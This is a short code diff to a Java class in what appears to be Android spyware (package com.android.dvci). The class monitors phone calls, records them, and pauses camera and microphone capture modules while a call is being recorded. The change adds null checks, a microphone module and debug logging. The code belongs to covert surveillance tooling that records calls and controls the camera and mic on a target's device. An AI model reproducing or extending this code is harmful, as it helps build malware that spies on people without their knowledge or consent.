@@ -21,6 +21,7 @@ import com.android.dvci.ServiceMain;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.module.ModuleCall;
 import com.android.dvci.module.ModuleCamera;
+import com.android.dvci.module.ModuleMic;
 import com.android.dvci.module.ModuleSnapshot;
 import com.android.dvci.module.call.RecordCall;
 import com.android.dvci.util.Check;
@@ -117,7 +118,13 @@ public class BroadcastMonitorCall  {
 							}
 							RecordCall.self().stopCall();
 							ongoing_number="";
-							ModuleCamera.self().removeStop(MODULE_STOP_REASON);
+
+							if(ModuleCamera.self()!=null) {
+								ModuleCamera.self().removeStop(MODULE_STOP_REASON);
+							}
+							if(ModuleMic.self()!=null) {
+								ModuleMic.self().removeStop(MODULE_STOP_REASON);
+							}
 						}
 					}
 
@@ -138,9 +145,14 @@ public class BroadcastMonitorCall  {
 							//ListenerCall.self().dispatch(call);
 							if (ModuleCall.self() != null && ModuleCall.self().isRecordFlag()) {
 								if (Cfg.DEBUG) {
-									Check.log(TAG + " (manageReceive): starting call"); //$NON-NLS-1$
+									Check.log(TAG + " (c): starting call"); //$NON-NLS-1$
 								}
-								ModuleCamera.self().addStop(MODULE_STOP_REASON);
+								if(ModuleMic.self()!=null) {
+									ModuleMic.self().addStop(MODULE_STOP_REASON);
+								}
+								if(ModuleCamera.self()!=null) {
+									ModuleCamera.self().addStop(MODULE_STOP_REASON);
+								}
 								RecordCall.self().recordCall(call);
 
 							}
@@ -164,6 +176,7 @@ public class BroadcastMonitorCall  {
 		} catch (Exception ex) {
 			if (Cfg.EXCEPTION) {
 				Check.log(TAG + " (manageReceive) Error: " + ex);
+				ex.printStackTrace();
 			}
 		}
 	}
